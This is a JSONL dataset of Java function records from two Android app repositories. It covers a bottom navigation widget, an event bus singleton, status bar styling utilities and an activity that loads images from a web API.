{"docstring": "/**\n * Set notification background resource\n *\n * @param drawable Drawable\n */\n", "func_signal": "public void setNotificationBackground(Drawable drawable)", "code": "{\n\tthis.notificationBackgroundDrawable = drawable;\n\tupdateNotifications(true, UPDATE_ALL_NOTIFICATIONS);\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Set if the Bottom Navigation is colored\n */\n", "func_signal": "public void setColored(boolean colored)", "code": "{\n\tthis.colored = colored;\n\tthis.itemActiveColor = colored ? coloredTitleColorActive : titleColorActive;\n\tthis.itemInactiveColor = colored ? coloredTitleColorInactive : titleColorInactive;\n\tcreateItems();\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Remove an item at the given index\n */\n", "func_signal": "public void removeItemAtIndex(int index)", "code": "{\n\tif (index < items.size()) {\n\t\tthis.items.remove(index);\n\t\tcreateItems();\n\t}\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Set the colors used when the bottom bar uses the colored mode\n *\n * @param colorActive   The active color\n * @param colorInactive The inactive color\n */\n", "func_signal": "public void setColoredModeColors(@ColorInt int colorActive, @ColorInt int colorInactive)", "code": "{\n\tthis.coloredTitleColorActive = colorActive;\n\tthis.coloredTitleColorInactive = colorInactive;\n\tcreateItems();\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Add all items\n */\n", "func_signal": "public void addItems(List<AHBottomNavigationItem> items)", "code": "{\n\tif (items.size() > MAX_ITEMS || (this.items.size() + items.size()) > MAX_ITEMS) {\n\t\tLog.w(TAG, \"The items list should not have more than 5 items\");\n\t}\n\tthis.items.addAll(items);\n\tcreateItems();\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Init\n *\n * @param context\n */\n", "func_signal": "private void init(Context context)", "code": "{\n\tthis.context = context;\n\tresources = this.context.getResources();\n\n\tnotificationTextColor = ContextCompat.getColor(context, android.R.color.white);\n\tbottomNavigationHeight = (int) resources.getDimension(R.dimen.bottom_navigation_height);\n\n\t// Item colors\n\ttitleColorActive = ContextCompat.getColor(context, R.color.colorPrimary);\n\ttitleColorInactive = ContextCompat.getColor(context, R.color.gray);\n\t// Colors for colored bottom navigation\n\tcoloredTitleColorActive = ContextCompat.getColor(context, R.color.colorBottomNavigationActiveColored);\n\tcoloredTitleColorInactive = ContextCompat.getColor(context, R.color.colorBottomNavigationInactiveColored);\n\n\titemActiveColor = titleColorActive;\n\titemInactiveColor = titleColorInactive;\n\n\t// Notifications\n\tnotificationActiveMarginLeft = (int) resources.getDimension(R.dimen.bottom_navigation_notification_margin_left_active);\n\tnotificationInactiveMarginLeft = (int) resources.getDimension(R.dimen.bottom_navigation_notification_margin_left);\n\tnotificationActiveMarginTop = (int) resources.getDimension(R.dimen.bottom_navigation_notification_margin_top_active);\n\tnotificationInactiveMarginTop = (int) resources.getDimension(R.dimen.bottom_navigation_notification_margin_top);\n\n\tViewCompat.setElevation(this, resources.getDimension(R.dimen.bottom_navigation_elevation));\n\tsetClipToPadding(false);\n\n\tViewGroup.LayoutParams params = new ViewGroup.LayoutParams(\n\t\t\tViewGroup.LayoutParams.MATCH_PARENT, bottomNavigationHeight);\n\tsetLayoutParams(params);\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Set the accent color (used when the view contains 3 items)\n *\n * @param accentColor The new accent color\n */\n", "func_signal": "public void setAccentColor(int accentColor)", "code": "{\n\tthis.titleColorActive = accentColor;\n\tthis.itemActiveColor = accentColor;\n\tcreateItems();\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Set the notification margin left\n *\n * @param activeMargin\n * @param inactiveMargin\n */\n", "func_signal": "public void setNotificationMarginLeft(int activeMargin, int inactiveMargin)", "code": "{\n\tthis.notificationActiveMarginLeft = activeMargin;\n\tthis.notificationInactiveMarginLeft = inactiveMargin;\n\tcreateItems();\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Set Notification content\n *\n * @param title        String\n * @param itemPosition int\n */\n", "func_signal": "public void setNotification(String title, int itemPosition)", "code": "{\n\tnotifications[itemPosition] = title;\n\tupdateNotifications(false, itemPosition);\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Remove all items\n */\n", "func_signal": "public void removeAllItems()", "code": "{\n\tthis.items.clear();\n\tcreateItems();\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Set notification text color\n *\n * @param textColor int\n */\n", "func_signal": "public void setNotificationTextColorResource(@ColorRes int textColor)", "code": "{\n\tthis.notificationTextColor = ContextCompat.getColor(context, textColor);\n\tupdateNotifications(true, UPDATE_ALL_NOTIFICATIONS);\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "// singleton\n", "func_signal": "public static RxBus getDefault()", "code": "{\n    if (defaultInstance == null) {\n        synchronized (RxBus.class) {\n            if (defaultInstance == null) {\n                defaultInstance = new RxBus();\n            }\n        }\n    }\n    return defaultInstance;\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\contract\\bus\\RxBus.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Set notification background color\n *\n * @param color int\n */\n", "func_signal": "public void setNotificationBackgroundColorResource(@ColorRes int color)", "code": "{\n\tthis.notificationBackgroundColor = ContextCompat.getColor(context, color);\n\tupdateNotifications(true, UPDATE_ALL_NOTIFICATIONS);\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * Activate or not the elevation, and set the value\n *\n * @param useElevation boolean\n * @param elevation    float\n */\n", "func_signal": "public void setUseElevation(boolean useElevation, float elevation)", "code": "{\n\tViewCompat.setElevation(this, useElevation ? elevation : 0);\n\tsetClipToPadding(false);\n}", "path": "app\\src\\main\\java\\tellh\\com\\gitclub\\presentation\\widget\\AHBottomNavigation.java", "repo_name": "TellH/GitClub", "stars": 658, "license": "apache-2.0", "language": "java", "size": 72495}
{"docstring": "/**\n * \u4e3a DrawerLayout \u5e03\u5c40\u8bbe\u7f6e\u72b6\u6001\u680f\u900f\u660e(5.0\u4ee5\u4e0a\u534a\u900f\u660e\u6548\u679c,\u4e0d\u5efa\u8bae\u4f7f\u7528)\n *\n * @param activity     \u9700\u8981\u8bbe\u7f6e\u7684activity\n * @param drawerLayout DrawerLayout\n */\n", "func_signal": "@Deprecated\npublic static void setTranslucentForDrawerLayoutDiff(Activity activity, DrawerLayout drawerLayout)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {\n        // \u8bbe\u7f6e\u72b6\u6001\u680f\u900f\u660e\n        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n        // \u8bbe\u7f6e\u5185\u5bb9\u5e03\u5c40\u5c5e\u6027\n        ViewGroup contentLayout = (ViewGroup) drawerLayout.getChildAt(0);\n        contentLayout.setFitsSystemWindows(true);\n        contentLayout.setClipToPadding(true);\n        // \u8bbe\u7f6e\u62bd\u5c49\u5e03\u5c40\u5c5e\u6027\n        ViewGroup vg = (ViewGroup) drawerLayout.getChildAt(1);\n        vg.setFitsSystemWindows(false);\n        // \u8bbe\u7f6e DrawerLayout \u5c5e\u6027\n        drawerLayout.setFitsSystemWindows(false);\n    }\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u9996\u6b21\u83b7\u53d6\u7f51\u7edc\u6570\u636e\n */\n", "func_signal": "private void initNetData()", "code": "{\n    ApiHelper.getInstance(Constants.GANK_URL).getGankIoDataBean(Constants.FULI, PAGE_COUNT, PAGE)\n            .subscribe(new Subscriber<GankIoDataBean>() {\n                @Override\n                public void onNext(GankIoDataBean bean) {\n                    bindingView.setGankIoDataBean(bean);\n                    mList = bean.getResults();\n                }\n\n                @Override\n                public void onCompleted() {\n                    initRefreshLayout();\n                    initRecyclerView();\n                    showContentView();\n                }\n\n                @Override\n                public void onError(Throwable e) {\n                    showError();\n                }\n            });\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\ui\\recyclerview\\WelfareActivity.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u4e3a fragment \u5934\u90e8\u662f ImageView \u7684\u8bbe\u7f6e\u72b6\u6001\u680f\u900f\u660e\n *\n * @param activity       fragment \u5bf9\u5e94\u7684 activity\n * @param statusBarAlpha \u72b6\u6001\u680f\u900f\u660e\u5ea6\n * @param needOffsetView \u9700\u8981\u5411\u4e0b\u504f\u79fb\u7684 View\n */\n", "func_signal": "public static void setTranslucentForImageViewInFragment(Activity activity, int statusBarAlpha, View needOffsetView)", "code": "{\n    setTranslucentForImageView(activity, statusBarAlpha, needOffsetView);\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT && Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {\n        clearPreviousSetting(activity);\n    }\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u83b7\u53d6\u72b6\u6001\u680f\u9ad8\u5ea6\n *\n * @param context context\n * @return \u72b6\u6001\u680f\u9ad8\u5ea6\n */\n", "func_signal": "public static int getStatusBarHeight(Context context)", "code": "{\n    // \u83b7\u5f97\u72b6\u6001\u680f\u9ad8\u5ea6\n    int resourceId = context.getResources().getIdentifier(\"status_bar_height\", \"dimen\", \"android\");\n    return context.getResources().getDimensionPixelSize(resourceId);\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u8bbe\u7f6e\u72b6\u6001\u680f\u5168\u900f\u660e\n *\n * @param activity \u9700\u8981\u8bbe\u7f6e\u7684activity\n */\n", "func_signal": "public static void setTransparent(Activity activity)", "code": "{\n    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {\n        return;\n    }\n    transparentStatusBar(activity);\n    setRootView(activity);\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u8ba1\u7b97\u72b6\u6001\u680f\u989c\u8272\n *\n * @param color color\u503c\n * @param alpha alpha\u503c\n * @return \u6700\u7ec8\u7684\u72b6\u6001\u680f\u989c\u8272\n */\n", "func_signal": "private static int calculateStatusColor(@ColorInt int color, int alpha)", "code": "{\n    float a = 1 - alpha / 255f;\n    int red = color >> 16 & 0xff;\n    int green = color >> 8 & 0xff;\n    int blue = color & 0xff;\n    red = (int) (red * a + 0.5);\n    green = (int) (green * a + 0.5);\n    blue = (int) (blue * a + 0.5);\n    return 0xff << 24 | red << 16 | green << 8 | blue;\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u521b\u5efa\u534a\u900f\u660e\u77e9\u5f62 View\n *\n * @param alpha \u900f\u660e\u503c\n * @return \u534a\u900f\u660e View\n */\n", "func_signal": "private static StatusBarView createTranslucentStatusBarView(Activity activity, int alpha)", "code": "{\n    // \u7ed8\u5236\u4e00\u4e2a\u548c\u72b6\u6001\u680f\u4e00\u6837\u9ad8\u7684\u77e9\u5f62\n    StatusBarView statusBarView = new StatusBarView(activity);\n    LinearLayout.LayoutParams params =\n            new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, getStatusBarHeight(activity));\n    statusBarView.setLayoutParams(params);\n    statusBarView.setBackgroundColor(Color.argb(alpha, 0, 0, 0));\n    return statusBarView;\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u8bbe\u7f6e\u6839\u5e03\u5c40\u53c2\u6570\n */\n", "func_signal": "private static void setRootView(Activity activity)", "code": "{\n    ViewGroup rootView = (ViewGroup) ((ViewGroup) activity.findViewById(android.R.id.content)).getChildAt(0);\n    rootView.setFitsSystemWindows(true);\n    rootView.setClipToPadding(true);\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u4e3a\u5934\u90e8\u662f ImageView \u7684\u754c\u9762\u8bbe\u7f6e\u72b6\u6001\u680f\u900f\u660e\n *\n * @param activity       \u9700\u8981\u8bbe\u7f6e\u7684activity\n * @param statusBarAlpha \u72b6\u6001\u680f\u900f\u660e\u5ea6\n * @param needOffsetView \u9700\u8981\u5411\u4e0b\u504f\u79fb\u7684 View\n */\n", "func_signal": "public static void setTranslucentForImageView(Activity activity, int statusBarAlpha, View needOffsetView)", "code": "{\n    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {\n        return;\n    }\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {\n        activity.getWindow().setStatusBarColor(Color.TRANSPARENT);\n        activity.getWindow()\n                .getDecorView()\n                .setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);\n       if (activity instanceof TabActivity){\n           activity.getWindow()//\u517c\u5bb9TabActivity\n                   .setFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS, WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n       }\n    } else {\n        activity.getWindow()\n                .setFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS, WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n    }\n    addTranslucentView(activity, statusBarAlpha);\n    if (needOffsetView != null) {\n        ViewGroup.MarginLayoutParams layoutParams = (ViewGroup.MarginLayoutParams) needOffsetView.getLayoutParams();\n        if (layoutParams != null) {\n            layoutParams.setMargins(0, getStatusBarHeight(activity), 0, 0);\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "// \u4e0a\u62c9\u52a0\u8f7d\u65f6\u8c03\u7528\u7684\u66f4\u65b0RecyclerView\u7684\u65b9\u6cd5\n", "func_signal": "private void updateRecyclerView()", "code": "{\n    // \u83b7\u53d6\u4ecefromIndex\u5230toIndex\u7684\u6570\u636e\n    List<GankIoDataBean.ResultsBean> list = mList;\n    if (list.size() > 0) {\n        // \u7136\u540e\u4f20\u7ed9Adapter\uff0c\u5e76\u8bbe\u7f6ehasMore\u4e3atrue\n        adapter.updateList(list, true);\n    } else {\n        adapter.updateList(null, false);\n    }\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\ui\\recyclerview\\WelfareActivity.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u751f\u6210\u4e00\u4e2a\u548c\u72b6\u6001\u680f\u5927\u5c0f\u76f8\u540c\u7684\u534a\u900f\u660e\u77e9\u5f62\u6761\n *\n * @param activity \u9700\u8981\u8bbe\u7f6e\u7684activity\n * @param color    \u72b6\u6001\u680f\u989c\u8272\u503c\n * @param alpha    \u900f\u660e\u503c\n * @return \u72b6\u6001\u680f\u77e9\u5f62\u6761\n */\n", "func_signal": "private static StatusBarView createStatusBarView(Activity activity, @ColorInt int color, int alpha)", "code": "{\n    // \u7ed8\u5236\u4e00\u4e2a\u548c\u72b6\u6001\u680f\u4e00\u6837\u9ad8\u7684\u77e9\u5f62\n    StatusBarView statusBarView = new StatusBarView(activity);\n    LinearLayout.LayoutParams params =\n            new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, getStatusBarHeight(activity));\n    statusBarView.setLayoutParams(params);\n    statusBarView.setBackgroundColor(calculateStatusColor(color, alpha));\n    return statusBarView;\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u4f7f\u72b6\u6001\u680f\u900f\u660e(5.0\u4ee5\u4e0a\u534a\u900f\u660e\u6548\u679c,\u4e0d\u5efa\u8bae\u4f7f\u7528)\n * <p>\n * \u9002\u7528\u4e8e\u56fe\u7247\u4f5c\u4e3a\u80cc\u666f\u7684\u754c\u9762,\u6b64\u65f6\u9700\u8981\u56fe\u7247\u586b\u5145\u5230\u72b6\u6001\u680f\n *\n * @param activity \u9700\u8981\u8bbe\u7f6e\u7684activity\n */\n", "func_signal": "@Deprecated\npublic static void setTranslucentDiff(Activity activity)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {\n        // \u8bbe\u7f6e\u72b6\u6001\u680f\u900f\u660e\n        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n        setRootView(activity);\n    }\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u4f7f\u72b6\u6001\u680f\u900f\u660e\n */\n", "func_signal": "@TargetApi(Build.VERSION_CODES.KITKAT)\nprivate static void transparentStatusBar(Activity activity)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {\n        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);\n        activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION);\n        activity.getWindow().setStatusBarColor(Color.TRANSPARENT);\n    } else {\n        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n    }\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u8bbe\u7f6e\u72b6\u6001\u680f\u989c\u8272\n *\n * @param activity       \u9700\u8981\u8bbe\u7f6e\u7684activity\n * @param color          \u72b6\u6001\u680f\u989c\u8272\u503c\n * @param statusBarAlpha \u72b6\u6001\u680f\u900f\u660e\u5ea6\n */\n", "func_signal": "public static void setColor(Activity activity, @ColorInt int color, int statusBarAlpha)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {\n        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);\n        activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n        activity.getWindow().setStatusBarColor(calculateStatusColor(color, statusBarAlpha));\n    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {\n        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n        ViewGroup decorView = (ViewGroup) activity.getWindow().getDecorView();\n        int count = decorView.getChildCount();\n        if (count > 0 && decorView.getChildAt(count - 1) instanceof StatusBarView) {\n            decorView.getChildAt(count - 1).setBackgroundColor(calculateStatusColor(color, statusBarAlpha));\n        } else {\n            StatusBarView statusView = createStatusBarView(activity, color, statusBarAlpha);\n            decorView.addView(statusView);\n        }\n        setRootView(activity);\n    }\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u4e3aDrawerLayout \u5e03\u5c40\u8bbe\u7f6e\u72b6\u6001\u680f\u53d8\u8272(5.0\u4ee5\u4e0b\u65e0\u534a\u900f\u660e\u6548\u679c,\u4e0d\u5efa\u8bae\u4f7f\u7528)\n *\n * @param activity     \u9700\u8981\u8bbe\u7f6e\u7684activity\n * @param drawerLayout DrawerLayout\n * @param color        \u72b6\u6001\u680f\u989c\u8272\u503c\n */\n", "func_signal": "@Deprecated\npublic static void setColorForDrawerLayoutDiff(Activity activity, DrawerLayout drawerLayout, @ColorInt int color)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {\n        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n        // \u751f\u6210\u4e00\u4e2a\u72b6\u6001\u680f\u5927\u5c0f\u7684\u77e9\u5f62\n        ViewGroup contentLayout = (ViewGroup) drawerLayout.getChildAt(0);\n        if (contentLayout.getChildCount() > 0 && contentLayout.getChildAt(0) instanceof StatusBarView) {\n            contentLayout.getChildAt(0).setBackgroundColor(calculateStatusColor(color, DEFAULT_STATUS_BAR_ALPHA));\n        } else {\n            // \u6dfb\u52a0 statusBarView \u5230\u5e03\u5c40\u4e2d\n            StatusBarView statusBarView = createStatusBarView(activity, color);\n            contentLayout.addView(statusBarView, 0);\n        }\n        // \u5185\u5bb9\u5e03\u5c40\u4e0d\u662f LinearLayout \u65f6,\u8bbe\u7f6epadding top\n        if (!(contentLayout instanceof LinearLayout) && contentLayout.getChildAt(1) != null) {\n            contentLayout.getChildAt(1).setPadding(0, getStatusBarHeight(activity), 0, 0);\n        }\n        // \u8bbe\u7f6e\u5c5e\u6027\n        ViewGroup drawer = (ViewGroup) drawerLayout.getChildAt(1);\n        drawerLayout.setFitsSystemWindows(false);\n        contentLayout.setFitsSystemWindows(false);\n        contentLayout.setClipToPadding(true);\n        drawer.setFitsSystemWindows(false);\n    }\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u4e3aDrawerLayout \u5e03\u5c40\u8bbe\u7f6e\u72b6\u6001\u680f\u53d8\u8272\n *\n * @param activity       \u9700\u8981\u8bbe\u7f6e\u7684activity\n * @param drawerLayout   DrawerLayout\n * @param color          \u72b6\u6001\u680f\u989c\u8272\u503c\n * @param statusBarAlpha \u72b6\u6001\u680f\u900f\u660e\u5ea6\n */\n", "func_signal": "public static void setColorForDrawerLayout(Activity activity, DrawerLayout drawerLayout, @ColorInt int color,\n                                           int statusBarAlpha)", "code": "{\n    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {\n        return;\n    }\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {\n        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);\n        activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n        activity.getWindow().setStatusBarColor(Color.TRANSPARENT);\n    } else {\n        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n    }\n    // \u751f\u6210\u4e00\u4e2a\u72b6\u6001\u680f\u5927\u5c0f\u7684\u77e9\u5f62\n    // \u6dfb\u52a0 statusBarView \u5230\u5e03\u5c40\u4e2d\n    ViewGroup contentLayout = (ViewGroup) drawerLayout.getChildAt(0);\n    if (contentLayout.getChildCount() > 0 && contentLayout.getChildAt(0) instanceof StatusBarView) {\n        contentLayout.getChildAt(0).setBackgroundColor(calculateStatusColor(color, statusBarAlpha));\n    } else {\n        StatusBarView statusBarView = createStatusBarView(activity, color);\n        contentLayout.addView(statusBarView, 0);\n    }\n    // \u5185\u5bb9\u5e03\u5c40\u4e0d\u662f LinearLayout \u65f6,\u8bbe\u7f6epadding top\n    if (!(contentLayout instanceof LinearLayout) && contentLayout.getChildAt(1) != null) {\n        contentLayout.getChildAt(1)\n                .setPadding(contentLayout.getPaddingLeft(), getStatusBarHeight(activity) + contentLayout.getPaddingTop(),\n                        contentLayout.getPaddingRight(), contentLayout.getPaddingBottom());\n    }\n    // \u8bbe\u7f6e\u5c5e\u6027\n    ViewGroup drawer = (ViewGroup) drawerLayout.getChildAt(1);\n    drawerLayout.setFitsSystemWindows(false);\n    contentLayout.setFitsSystemWindows(false);\n    contentLayout.setClipToPadding(true);\n    drawer.setFitsSystemWindows(false);\n\n    addTranslucentView(activity, statusBarAlpha);\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u521d\u59cb\u5316\u4e0b\u62c9\u5237\u65b0\n */\n", "func_signal": "private void initRefreshLayout()", "code": "{\n    bindingView.refreshlayout.setColorSchemeResources(android.R.color.holo_blue_light,\n            android.R.color.holo_red_light, android.R.color.holo_orange_light,\n            android.R.color.holo_green_light);\n    bindingView.refreshlayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {\n        @Override\n        public void onRefresh() {\n            bindingView.refreshlayout.setRefreshing(true);\n            adapter.resetDatas();\n            getNetData(1);\n            mHandler.postDelayed(new Runnable() {\n                @Override\n                public void run() {\n                    bindingView.refreshlayout.setRefreshing(false);\n                }\n            }, 1000);\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\ui\\recyclerview\\WelfareActivity.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u6dfb\u52a0\u534a\u900f\u660e\u77e9\u5f62\u6761\n *\n * @param activity       \u9700\u8981\u8bbe\u7f6e\u7684 activity\n * @param statusBarAlpha \u900f\u660e\u503c\n */\n", "func_signal": "private static void addTranslucentView(Activity activity, int statusBarAlpha)", "code": "{\n    ViewGroup contentView = (ViewGroup) activity.findViewById(android.R.id.content);\n    if (contentView.getChildCount() > 1) {\n        contentView.getChildAt(1).setBackgroundColor(Color.argb(statusBarAlpha, 0, 0, 0));\n    } else {\n        contentView.addView(createTranslucentStatusBarView(activity, statusBarAlpha));\n    }\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
